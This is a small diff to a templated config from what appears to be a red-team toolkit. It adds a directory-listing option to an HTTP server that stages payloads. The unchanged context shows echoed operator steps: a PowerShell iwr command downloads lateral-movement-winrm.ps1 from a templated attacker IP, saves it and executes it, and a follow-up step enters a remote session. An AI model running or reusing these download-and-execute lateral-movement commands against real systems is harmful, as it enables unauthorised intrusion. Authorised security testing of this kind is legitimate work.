@@ -26,4 +26,4 @@ content: |
   echo 'Deliver, save to disk & execute: iwr -uri http://<%=$(esh variables/attacker_ip)%>/lateral-movement-winrm.ps1 -Outfile <%=$(esh variables/delivery_path_windows)%>\lateral-movement-winrm.ps1; <%=$(esh variables/delivery_path_windows)%>\lateral-movement-winrm.ps1'; \
   echo 'Enter the session: Enter-PSSession <sessionId that is displayed>'; \
   echo '================================================================'; \
-   python <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py -p <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
+   python <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py -p <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound <%=$(esh variables/delivery_dir_listing)%>
